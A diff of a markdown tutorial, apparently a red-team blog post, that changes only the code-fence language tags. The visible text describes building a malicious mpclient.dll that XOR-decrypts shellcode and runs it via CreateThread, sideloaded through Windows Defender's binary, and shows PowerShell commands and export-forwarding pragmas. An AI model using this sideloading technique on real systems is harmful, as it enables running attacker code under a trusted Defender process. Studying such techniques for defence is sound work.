@@ -75,7 +75,7 @@ Start by creating a new C++ project in Visual Studio for a "Dyamic-Link Library 
 We're going to create a relatively straightforward DLL which uses XOR decryption to decrypt shellcode and launch it via _CreateThread_. Upon execution, the shellcode will launch _calc.exe_ as a proof-of-concept.
 
 Here is the template code for our malicious DLL **mpclient.dll** which will run shellcode to spawn _calc.exe_:
-```
+```cpp
 #include "pch.h"
 #include <windows.h>
 
@@ -154,13 +154,13 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {
 Before we can finalize the malicious DLL, we will need to get a list of exported functions from the existing legitimate DLL on disk and add it to our malicious DLL. In order for the executable to run properly with our sideloaded DLL, we have to add the DLL's exported functions to the malicious DLL to forward these functions to the legit DLL on disk.<br /><br />
 
 Now to get the exported functions from the legitimate DLL **mpclient.dll** at its expected location ([detailed here](https://hijacklibs.net/entries/microsoft/built-in/mpclient.html)), we can use this [PowerShell script](https://gist.github.com/wsummerhill/23c138be8f953155e20c01055d6cf53f) with the following commands:<br />
-```
+```powershell
 PS> . .\Get-DLL-Exports.ps1
 PS> Get-DLL-Exports -DllPath %PROGRAMDATA%\Microsoft\Windows Defender\Platform\%VERSION%\mpclient.dll -ExportsToCpp C:\output\folder\MpClient-exports.txt
 ```
 
 After executing the PowerShell command, the output file **MpClient-exports.txt** should have all the DLL exports in it as shown below (shortened for brevity):
-```
+```cpp
 // --> ADD ALL EXPORTS BELOW TO THE TOP OF YOUR .CPP APPLICATION <--
 #pragma once
 #pragma comment (linker, "/export:MpAddDynamicSignatureFile=MpClient_orig.MpAddDynamicSignatureFile,@43")
